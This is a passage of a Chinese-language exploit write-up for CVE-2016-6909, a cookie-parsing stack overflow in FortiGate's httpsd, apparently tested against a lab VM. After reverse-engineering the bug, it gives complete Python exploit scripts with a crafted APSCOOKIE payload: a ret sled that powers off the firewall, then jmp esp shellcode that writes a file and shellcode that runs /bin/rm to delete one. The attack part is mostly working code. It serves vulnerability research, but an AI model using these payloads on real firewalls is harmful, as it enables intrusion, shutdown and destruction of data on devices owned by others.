      char *v11[4]; // [esp+8h] [ebp-10h] BYREF
      v10 = sub_83297EE(*a1, 1, 4);
      if ( a2 || (a2 = (_BYTE *)sub_8329B12(a1[34], "Cookie")) != 0 )
      {
        while ( *a2 )
        {
          v11[0] = (char *)sub_8344CBA(*a1, &a2, 59);
          if ( !v11[0] )
            break;
          while ( ((*__ctype_b_loc())[(unsigned __int8)*a2] & 0x2000) != 0 )
            ++a2;
          v2 = (const char *)sub_8344CBA(*a1, v11, 61);
          v3 = (const char *)sub_8204B9C(a1);
          if ( strstr(v2, v3) )
            sub_820CB5E(v11[0]);
    ...
其中 `sub_8329B12()` 函数调用了 `strcasecmp()`，大致分析应当是判断字符串存在性的函数，在这里传入的参数中包含字符串
`"Cookie"`，那么我们大致可以推测该函数应当是 httpsd （即本进程）中被用以处理 Cookie 相关的函数之一
局部变量 v3 的求解涉及到函数 `sub_8204B9C()`，如下：
    int __cdecl sub_8204B9C(_DWORD *a1)
    {
      int v1; // edx
      int v2; // eax
      v1 = 0;
      if ( nCfg_debug_zone )
        v1 = nCfg_debug_zone + 45972;
      v2 = sub_8204B37(v1);
      return sub_8329797(*a1, (int)"%s_%lu", "APSCOOKIE", v2);
    }
我们不难发现其最后调用的 `sub_8329797()` 传参形式应当是按格式化字符串进行解析，最终拼凑出来的形式应当如
`APSCOOKIE_114514` （示例数字）的形式，而上层调用中使用 `strstr()` 判断 v3 在 v2 中是否存在，这个形式我们与我们传入的
Cookie 的内容开头相吻合，由此我们可以推断出接下来的 `sub_820CB5E()` 函数应当涉及到对 Cookie 的解析工作
接下来继续分析 `sub_820CB5E()`：
    int __cdecl sub_820CB5E(char *a1)
    {
      //...
      char s[108]; // [esp+116Ch] [ebp-6Ch] BYREF
      size = 1;
      if ( a1 )
        size = strlen(a1) + 1;
      src = 0;
      memset(s, 0, 0x52u);
      v16 = 20;
      memset(v21, 0, sizeof(v21));
      ptr = 0;
      v7 = -1;
      if ( a1 )
      {
        sub_820C6F0();
        if ( sscanf(a1, "Era=%1d&Payload=%[^&]&AuthHash=%s", &v17, v21, s) == 3 )
        {
    ...
做 pwn 的同学应该 **第一眼就能够看到一个大大的 %s 映入你的眼帘，十分明显的一个栈溢出** ，我们的漏洞便位于这个位置：对 Cookie
内容的解析使用了不安全的 `%s` 读取 AuthHash 到栈上从而使得其存在栈溢出漏洞
> 这个年代还有针对 `%s` 的漏洞属实令人泪目
## 0x02.漏洞利用
httpsd 为对 init 的软链接，首先我们先对 init 程序进行安全检查：
    $ checksec ./init
    [*] '/home/arttnba3/Desktop/cves/CVE-2016-6909/exploit/init'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments
        RPATH:    b'../lib:../ulib:/fortidev/lib:/lib'
**保 护 全 关** ，我们有相当大的操作空间
###  ret2text
由于其与传统 pwn 题的交互界面不同，我们只有一次 post 的机会，所以需要在这一次 post 中 **一 步 到 位**
，相应地，虽然我们无法通过交互获取 libc，但是在 init 文件中有着大量的 gadget，又没开 PIE，故直接 ret2text 即可
先试一下我们是否真的能直接控制程序执行流，随便找一段 gadget 简单试一下，笔者这里选用了一段关机代码
    .text:080601AE                 push    4321FEDCh       ; howto
    .text:080601B3                 call    _reboot
> `reboot(RB_POWER_OFF)`
http 请求头的长度毫无疑问能够满足我们对 payload 的要求，故笔者这里直接使用大量的 `ret` 指令作为 slide
code，省去计算溢出长度的必要：
    from requests import *
    from pwn import *
    #e = ELF('./init')
    url = 'http://192.168.116.100/index'
    headers = {
        'Content-Type':'application/json',
        'Content-Length':'12',
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate,br',
        'User-Agent':'PostmanRuntime/7.28.3', 
        'Host':'192.168.116.100', 
        'Cookie':'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=' + '\x1c\x8d\x04\x08' * 100 + '\xae\x01\x06\x08'
        }
    r = post(url, headers = headers)
    print(r.text)
    print(r.headers)
可以发现 fortigate VM 被成功关机：
> 好像没啥意义的截图（）
###  ret2shellcode
ROP链的拼接较为繁琐，且对于 `%s` 而言 **空白字符无法被捕获** ，由于没有开启 NX 保护，我们可以考虑通过`jmp esp` 的 gadget
来 **直接执行 shellcode**
当然，有的功能其实还是可以直接使用 init 文件中存在的函数的，比如说 open 和 write
下面这段代码调用了 open 进行了文件的创建并向文件内写入了字符串 `arttnba3`
    from requests import *
    from pwn import *
    context.arch = 'i386'
    #e = ELF('./init')
    url = 'http://192.168.116.100/index'
    cookie = ''
    cookie += 'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash='
    cookie += '\x1c\x8d\x04\x08' * 100 # ret
    cookie += '\xf7\xbd\x96\x08' # add eax, ebp ; jmp esp
    # following are shellcode
    cookie += '\x90' * 0x80 # slide code nop
    cookie += '1\xc0PhflagTXjBP\xbb$\xe3\x05\x08\xff\xd31\xc9Qhnba3harttT[j\x08SP\xbb\x84\xb5\x05\x08\xff\xd3' # 'xor eax, eax ; push eax ; push 0x67616c66 ; push esp ; pop eax ; push 0102 ; push eax ; mov ebx, 0x805E324 ; call ebx ; xor ecx, ecx ; push ecx ; push 0x3361626e ; push 0x74747261 ; push esp ; pop ebx ; push 8 ; push ebx ; push eax ; mov ebx, 0x805B584 ; call ebx'
    headers = {
        'Content-Type':'application/json',
        'Content-Length':'12',
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate,br',
        'User-Agent':'PostmanRuntime/7.28.3', 
        'Host':'192.168.116.100', 
        'Cookie':cookie
        }
    r = post(url, headers = headers)
    print(r.text)
    print(r.headers)
发送 http 请求，我们成功地在防火墙内创建文件并写入特定内容
下列 shellcode 通过系统调用 execve 调用 `/bin/rm` 删除我们的 flag
    ...
    cookie += '1\xc0Ph//rmh/binT[PhflagTYPQSTY\x89\xc2@@@@@@@@@@@\xcd\x80' # 'xor eax, eax ; push eax ; push 0x6d722f2f ; push 0x6e69622f ; push esp ; pop ebx ; push eax ; push 0x67616c66 ; push esp ; pop ecx ; push eax ; push ecx ; push ebx ; push esp ; pop ecx ; mov edx, eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; int 0x80'
    ...
发送 http 请求，可以看到 flag 文件已被删除
接下来我们便可以使用自己构造的 shellcode 为所欲为了，网上也有很多 shellcode 生成工具，这里笔者便不再独立贴出其他 shellcode
了
## 0x03.What’s more…
安全产品是为了确保安全而引入的，但安全产品又会有新的安全问题，这个时候又要引入新的安全产品来确保安全产品的安全，然后便是无限套娃…
笔者认为， **“安全问题本质上还是人的问题”** ，只有我们每一位开发者都真正重视起安全问题，很多没有必要的损失才能得以避免